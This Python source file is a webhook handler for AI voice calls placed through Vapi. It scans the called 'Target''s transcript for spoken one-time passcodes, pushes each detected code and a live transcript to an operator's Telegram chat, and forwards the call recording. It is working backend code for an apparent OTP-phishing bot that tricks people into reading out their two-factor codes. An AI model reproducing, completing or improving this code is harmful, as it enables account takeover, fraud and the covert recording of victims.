import json
import logging
import os
import re
import threading
from datetime import datetime
from typing import Optional

import requests
from flask import Response

logger = logging.getLogger(__name__)


def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str]:
    if not text:
        return None

    sep_pattern = r"\d[-\s]?" * (code_length - 1) + r"\d"
    patterns = [
        rf"\b(\d{{{code_length}}})\b",
        rf"(?<!\d)(\d\s?){{{code_length}}}(?!\d)",
        rf"\b({sep_pattern})\b",
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            raw = match.group(1) if match.lastindex else match.group(0)
            digits = re.sub(r"[^0-9]", "", raw)
            if len(digits) == code_length and digits.isdigit():
                return digits

    all_digits = re.sub(r"[^0-9]", "", text)
    for i in range(len(all_digits) - code_length + 1):
        candidate = all_digits[i:i + code_length]
        if len(candidate) == code_length and candidate.isdigit():
            return candidate
    return None


def _send_telegram(chat_id: int, text: str, **kwargs):
    if not chat_id:
        return
    try:
        from handlers.otp_notifier import _bot_instance
        if _bot_instance:
            _bot_instance.send_message(chat_id, text, **kwargs)
        else:
            import telebot
            token = os.getenv("BOT_TOKEN", "")
            if token and token != "YOUR_BOT_TOKEN_HERE":
                tb = telebot.TeleBot(token)
                tb.send_message(chat_id, text, **kwargs)
    except Exception as e:
        logger.warning("Failed to send Telegram message to %s: %s", chat_id, e)


def _send_live_status(chat_id, text: str, **kwargs) -> None:
    if not chat_id:
        return
    _send_telegram(int(chat_id), text, **kwargs)


def _extract_metadata(payload: dict, call_data: Optional[dict] = None) -> dict:
    return (
        payload.get("metadata")
        or (call_data or {}).get("metadata")
        or payload.get("message", {}).get("metadata")
        or {}
    )


def handle_vapi_webhook(request) -> Response:
    try:
        payload = request.get_json(force=True, silent=True)
        if not payload:
            return Response("Invalid payload", status=400)

        event_type = payload.get("type") or payload.get("event") or payload.get("message", {}).get("type")
        call_data = payload.get("call") or payload.get("message", {}).get("call", {})
        vapi_call_id = call_data.get("id") or payload.get("callId")
        call_sid = call_data.get("twilioCallSid") or call_data.get("phoneCallProviderId")

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id")

        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s payload_keys=%s call_keys=%s",
                     event_type, vapi_call_id, call_sid, chat_id,
                     list(payload.keys()), list(call_data.keys()))

        if not chat_id:
            logger.info("[VAPI_WEBHOOK] no chat_id — payload top keys=%s call keys=%s",
                         list(payload.keys()), list(call_data.keys()))

        if event_type in ("call.started", "call.ringing"):
            _send_live_status(chat_id, "📞 Ringing...")
            return Response("OK")

        if event_type == "call.answered":
            _send_live_status(chat_id, "☎️ Live")
            return Response("OK")

        if event_type in ("call.in-progress", "call.in_progress"):
            _send_live_status(chat_id, "⏳ In progress")
            return Response("OK")

        if event_type in ("transcript", "transcription", "call.transcript"):
            return _handle_transcript(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("call.ended", "call.completed", "call.failed", "call.error"):
            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("recording.ready", "recording"):
            return _handle_recording(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("assistant.started",):
            _send_live_status(chat_id, "📞 AI placing the call")
            return Response("OK")

        if event_type in ("speech-update", "conversation-update"):
            return _handle_transcript(payload, call_sid, vapi_call_id, call_data)

        if event_type == "status-update":
            call_status = call_data.get("status", "")
            logger.info("[VAPI_STATUS_UPDATE] status=%s call_sid=%s", call_status, call_sid)
            if call_status == "queued":
                _send_live_status(chat_id, "⏳ Queued")
            elif call_status == "ringing":
                _send_live_status(chat_id, "📞 Ringing...")
            elif call_status in ("in-progress", "answered"):
                _send_live_status(chat_id, "☎️ Live")
                if call_sid:
                    from bot import get_call_session
                    s = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
                    if s:
                        s["call_was_in_progress"] = True
            elif call_status in ("completed", "failed", "canceled", "ended", "no-answer", "busy", "error"):
                return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
            return Response("OK")

        if event_type == "end-of-call-report":
            logger.info("[VAPI_END_OF_CALL_REPORT] call_sid=%s vapi_call_id=%s", call_sid, vapi_call_id)
            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)

        logger.info("[VAPI_UNKNOWN_EVENT] type=%s", event_type)
        return Response("OK")

    except Exception as e:
        logger.error("[VAPI_WEBHOOK_ERROR] %s", e, exc_info=True)
        return Response("Error", status=500)


def _extract_otp_from_messages(
    messages: list,
    code_length: int,
    call_sid: Optional[str],
    vapi_call_id: Optional[str],
    chat_id: Optional[int],
    user_id: Optional[str],
) -> Optional[str]:
    for msg in messages:
        role = msg.get("role", "")
        if role != "customer":
            continue
        text = msg.get("transcript") or msg.get("content") or msg.get("text") or msg.get("message") or ""
        if not text:
            continue
        otp = extract_otp_from_transcript(text, code_length)
        if otp:
            logger.info("[VAPI_OTP_DETECTED_ARTIFACT] otp=%s call_sid=%s", otp, call_sid)
            _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
            if chat_id and call_sid:
                from handlers.otp_notifier import notify_otp_captured
                notify_otp_captured(
                    chat_id=int(chat_id),
                    call_sid=call_sid,
                    user_id=user_id or "unknown",
                    digits=otp,
                    vapi_call_id=vapi_call_id,
                )
            return otp
    return None


def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        event_type = payload.get("type") or payload.get("event") or ""
        message = payload.get("message", payload)

        transcript_text = ""
        role = "assistant"

        if event_type in ("transcript", "transcription", "call.transcript"):
            transcript_text = (
                message.get("transcript")
                or message.get("text")
                or message.get("transcription")
                or ""
            )
            role = message.get("role", "assistant")
        elif event_type == "speech-update":
            speech = payload.get("speech", {})
            transcript_text = (
                speech.get("transcript")
                or speech.get("text")
                or speech.get("transcription")
                or ""
            )
            role = speech.get("role", "assistant")
        elif event_type == "conversation-update":
            msgs = payload.get("messages", [])
            for msg in reversed(msgs):
                msg_role = msg.get("role", "")
                if msg_role == "customer":
                    transcript_text = (
                        msg.get("transcript")
                        or msg.get("content")
                        or msg.get("text")
                        or msg.get("message")
                        or ""
                    )
                    if transcript_text:
                        role = "customer"
                        break
        else:
            transcript_text = (
                message.get("transcript")
                or message.get("text")
                or message.get("transcription")
                or ""
            )
            role = message.get("role", "assistant")

        metadata = _extract_metadata(payload, call_data)
        code_length = int(metadata.get("code_length", 6))
        user_id = metadata.get("user_id")
        chat_id = metadata.get("chat_id")

        if transcript_text:
            if role == "customer":
                _send_live_status(chat_id, f"👤 Target: {transcript_text}")
            else:
                _send_live_status(chat_id, f"💬 AI: {transcript_text}")

        if role == "customer" and transcript_text:
            otp = extract_otp_from_transcript(transcript_text, code_length)
            if otp:
                from bot import get_call_session
                session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
                if session and session.get("otp") == otp:
                    logger.info("[VAPI_OTP] duplicate OTP %s for call %s, skipping", otp, call_sid)
                    return Response("OK")
                logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
                if chat_id and call_sid:
                    from handlers.otp_notifier import notify_otp_captured
                    notify_otp_captured(
                        chat_id=int(chat_id),
                        call_sid=call_sid,
                        user_id=user_id or "unknown",
                        digits=otp,
                        vapi_call_id=vapi_call_id,
                    )
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_TRANSCRIPT_ERROR] %s", e)
        return Response("OK")


def _extract_recording_url(payload: dict, call_data: Optional[dict] = None) -> Optional[str]:
    sources = [
        lambda: (call_data or {}).get("recordingUrl"),
        lambda: (call_data or {}).get("artifact", {}).get("recordingUrl"),
        lambda: payload.get("recordingUrl"),
        lambda: payload.get("message", {}).get("recordingUrl"),
        lambda: payload.get("call", {}).get("recordingUrl"),
        lambda: payload.get("call", {}).get("artifact", {}).get("recordingUrl"),
        lambda: payload.get("message", {}).get("call", {}).get("recordingUrl"),
        lambda: payload.get("message", {}).get("call", {}).get("artifact", {}).get("recordingUrl"),
    ]
    for src in sources:
        url = src()
        if url:
            return url
    return None


def _download_recording_file(recording_url: str, vapi_call_id: Optional[str] = None) -> Optional[bytes]:
    try:
        resp = requests.get(recording_url, timeout=120)
        if resp.status_code == 200 and len(resp.content) > 1024:
            logger.info("[VAPI_RECORDING] download OK size=%s", len(resp.content))
            return resp.content
        logger.info("[VAPI_RECORDING] download status=%s size=%s (url=%s)",
                     resp.status_code, len(resp.content or b""), recording_url[:60])
    except Exception as e:
        logger.warning("[VAPI_RECORDING] download error=%s (url=%s)", e, recording_url[:60])

    if vapi_call_id:
        try:
            from services.vapi_service import get_call
            call_data = get_call(vapi_call_id)
            if call_data:
                fresh_url = (
                    call_data.get("recordingUrl")
                    or call_data.get("artifact", {}).get("recordingUrl")
                )
                if fresh_url and fresh_url != recording_url:
                    logger.info("[VAPI_RECORDING] fresh URL from API, retrying download")
                    resp = requests.get(fresh_url, timeout=120)
                    if resp.status_code == 200 and len(resp.content) > 1024:
                        return resp.content
                    logger.info("[VAPI_RECORDING] fresh URL download status=%s size=%s",
                                 resp.status_code, len(resp.content or b""))
        except Exception as e:
            logger.warning("[VAPI_RECORDING] API fallback error=%s", e)

    return None


def _send_audio_to_telegram(chat_id: int, audio_data: bytes, call_sid: Optional[str], ext: str) -> bool:
    from handlers.otp_notifier import _bot_instance
    import io
    audio_io = io.BytesIO(audio_data)
    audio_io.name = f"recording_{call_sid or 'unknown'}{ext}"
    try:
        if _bot_instance:
            _bot_instance.send_audio(chat_id, audio_io, caption="📞 Call recording", timeout=120)
        else:
            import telebot
            token = os.getenv("BOT_TOKEN", "")
            if token and token != "YOUR_BOT_TOKEN_HERE":
                tb = telebot.TeleBot(token)
                tb.send_audio(chat_id, audio_io, caption="📞 Call recording", timeout=120)
        return True
    except Exception as e:
        logger.warning("[VAPI_RECORDING] send_audio failed: %s", e)
        try:
            audio_io.seek(0)
            if _bot_instance:
                _bot_instance.send_document(chat_id, audio_io, caption="📞 Call recording", timeout=120)
            else:
                import telebot
                token = os.getenv("BOT_TOKEN", "")
                if token and token != "YOUR_BOT_TOKEN_HERE":
                    tb = telebot.TeleBot(token)
                    tb.send_document(chat_id, audio_io, caption="📞 Call recording", timeout=120)
            return True
        except Exception as e2:
            logger.error("[VAPI_RECORDING] send_document also failed: %s", e2)
            return False


def _resolve_chat_id(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict]) -> Optional[str]:
    metadata = _extract_metadata(payload, call_data)
    chat_id = metadata.get("chat_id")
    if chat_id:
        return chat_id
    session_id = call_sid or vapi_call_id
    if session_id:
        try:
            from bot import get_call_session
            session = get_call_session(session_id)
            if session and session.get("chat_id"):
                logger.info("[VAPI_CALL_ENDED] resolved chat_id from session %s", session_id)
                return session["chat_id"]
        except Exception:
            pass
    return None


def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        cd = call_data or payload.get("call", payload)
        duration_ms = cd.get("durationMs") or 0
        duration_s = round(duration_ms / 1000) if duration_ms else 0
        status = cd.get("status", "completed")
        ended_reason = cd.get("endedReason", "")

        from bot import get_call_session
        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
        if session and session.get("call_ended_processed"):
            logger.info("[VAPI_CALL_ENDED] already processed for call_sid=%s, skipping duplicate", call_sid)
            return Response("OK")

        if status == "queued":
            if session and session.get("call_was_in_progress"):
                logger.info("[VAPI_CALL_ENDED] call was in-progress, overriding 'queued' status")
                status = "ended"
            elif ended_reason:
                reason_to_status = {
                    "customer-ended-call": "completed",
                    "assistant-ended-call": "completed",
                    "customer-did-not-answer": "no-answer",
                    "customer-busy": "busy",
                    "customer-did-not-respond": "completed",
                    "assistant-error": "failed",
                    "pipeline-error": "failed",
                    "silence-timed-out": "completed",
                }
                mapped = reason_to_status.get(ended_reason)
                if mapped:
                    logger.info("[VAPI_CALL_ENDED] remapped status from '%s' to '%s' using endedReason='%s'",
                                 status, mapped, ended_reason)
                    status = mapped

        logger.info("[VAPI_CALL_ENDED] call_sid=%s duration=%ss status=%s endedReason=%s",
                     call_sid, duration_s, status, ended_reason)

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id") or _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
        user_id = metadata.get("user_id")

        recording_url = _extract_recording_url(payload, call_data)

        try:
            from services.analytics import finalize_call_history
            finalize_call_history(
                user_id,
                call_sid,
                vapi_call_id=vapi_call_id,
                status=status,
                duration_s=duration_s,
                ended_reason=ended_reason,
                otp=(session or {}).get("otp") or "",
                recording=bool(recording_url),
                session=session,
            )
        except Exception:
            logger.exception("[VAPI_ANALYTICS] failed to finalize call history")

        if chat_id:
            if status == "completed":
                _send_live_status(chat_id, f"✅ Ended ({duration_s}s)")
            elif status == "failed":
                _send_live_status(chat_id, "❌ Failed")
            elif status == "no-answer":
                _send_live_status(chat_id, "⏱️ No answer")
            elif status == "busy":
                _send_live_status(chat_id, "ℹ️ Busy")
            elif status == "canceled":
                _send_live_status(chat_id, "ℹ️ Canceled")
            elif status == "ended":
                _send_live_status(chat_id, f"📞 Ended" +
                                  (f" ({ended_reason})" if ended_reason else ""))
            elif status == "queued":
                _send_live_status(chat_id, "❌ No connect")
            else:
                _send_live_status(chat_id, f"📞 {status}")
            try:
                send_call_complete_menu(int(chat_id))
            except Exception:
                pass

        if chat_id:
            if recording_url:
                logger.info("[VAPI_CALL_ENDED] recording url found in webhook, triggering download")
                threading.Thread(
                    target=_download_and_send_recording,
                    args=(recording_url, call_sid, vapi_call_id, chat_id, user_id),
                    daemon=True,
                ).start()
            elif vapi_call_id:
                logger.info("[VAPI_CALL_ENDED] no recording url in webhook, fetching from Vapi API")
                threading.Thread(
                    target=_fetch_and_send_recording_via_api,
                    args=(vapi_call_id, call_sid, chat_id, user_id),
                    daemon=True,
                ).start()
            else:
                logger.info("[VAPI_CALL_ENDED] no recording url and no vapi_call_id to fetch")

        if session:
            session["call_ended_processed"] = True

        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_CALL_ENDED_ERROR] %s", e)
        return Response("OK")


def _fetch_and_send_recording_via_api(vapi_call_id: str, call_sid: Optional[str], chat_id: int, user_id: Optional[str]):
    try:
        from services.vapi_service import get_call, VapiError
        try:
            call_data = get_call(vapi_call_id)
        except VapiError as e:
            logger.error("[VAPI_RECORDING_API] Cannot fetch recording: %s", e)
            _send_telegram(chat_id, "⚠️ Recording unavailable - Vapi API key not configured.")
            return
        if not call_data:
            logger.warning("[VAPI_RECORDING_API] get_call returned nothing for %s", vapi_call_id)
            _send_telegram(chat_id, "⚠️ Recording not available via API.")
            return
        recording_url = (
            call_data.get("recordingUrl")
            or call_data.get("artifact", {}).get("recordingUrl")
        )
        if not recording_url:
            logger.warning("[VAPI_RECORDING_API] no recordingUrl in fetched call data for %s", vapi_call_id)
            _send_telegram(chat_id, "⚠️ No recording URL found for this call.")
            return
        logger.info("[VAPI_RECORDING_API] got recording url from API for %s", vapi_call_id)
        _download_and_send_recording(recording_url, call_sid, vapi_call_id, chat_id, user_id)
    except Exception as e:
        logger.error("[VAPI_RECORDING_API_ERROR] %s", e)
        if chat_id:
            _send_telegram(chat_id, "⚠️ Failed to fetch recording.")


def _download_and_send_recording(recording_url: str, call_sid: Optional[str], vapi_call_id: Optional[str], chat_id: int, user_id: Optional[str]):
    _send_live_status(chat_id, "🎙 DL recording...")
    audio_data = _download_recording_file(recording_url, vapi_call_id)
    if not audio_data:
        logger.error("[VAPI_RECORDING] download failed for %s", recording_url[:80])
        _send_telegram(chat_id, "⚠️ Recording download failed.")
        return

    MAX_TELEGRAM_SIZE = 50 * 1024 * 1024
    if len(audio_data) > MAX_TELEGRAM_SIZE:
        logger.warning("[VAPI_RECORDING] file too large for Telegram: %s bytes", len(audio_data))
        _send_telegram(chat_id, f"⚠️ Recording too large for Telegram ({len(audio_data)//1024//1024}MB). Save URL: {recording_url}")
        return

    ext = ".wav"
    if "stereo.wav" in recording_url or ".wav" in recording_url:
        ext = ".wav"
    elif ".mp3" in recording_url:
        ext = ".mp3"
    elif ".ogg" in recording_url:
        ext = ".ogg"

    if user_id:
        try:
            from core.files import ensure_user_path, user_conf_path
            ensure_user_path(user_id)
            file_path = str(user_conf_path(user_id) / f"recording{ext}")
            with open(file_path, "wb") as f:
                f.write(audio_data)
            logger.info("[VAPI_RECORDING] saved to %s", file_path)
        except Exception as e:
            logger.warning("[VAPI_RECORDING] failed to save locally: %s", e)

    _send_live_status(chat_id, "🎙 Sending...")
    sent = _send_audio_to_telegram(int(chat_id), audio_data, call_sid, ext)
    if sent:
        _send_live_status(chat_id, f"✅ Recording ({ext})")
    else:
        _send_telegram(chat_id, f"✅ Call completed. Recording saved to disk ({ext}).")
    try:
        from services.analytics import mark_call_recording
        mark_call_recording(user_id, call_sid, vapi_call_id)
    except Exception:
        pass
    try:
        from bot import send_call_complete_menu
        send_call_complete_menu(int(chat_id))
    except Exception:
        pass


def _handle_recording(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        recording_url = _extract_recording_url(payload, call_data)
        if not recording_url:
            logger.info("[VAPI_RECORDING] no recordingUrl in payload")
            if vapi_call_id:
                metadata = _extract_metadata(payload, call_data)
                chat_id = metadata.get("chat_id")
                user_id = metadata.get("user_id")
                if chat_id:
                    threading.Thread(
                        target=_fetch_and_send_recording_via_api,
                        args=(vapi_call_id, call_sid, chat_id, user_id),
                        daemon=True,
                    ).start()
            return Response("OK")

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id")
        user_id = metadata.get("user_id")

        logger.info("[VAPI_RECORDING] url=%s chat_id=%s user_id=%s", recording_url[:80], chat_id, user_id)

        if chat_id:
            threading.Thread(
                target=_download_and_send_recording,
                args=(recording_url, call_sid, vapi_call_id, chat_id, user_id),
                daemon=True,
            ).start()
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_RECORDING_ERROR] %s", e)
        return Response("OK")
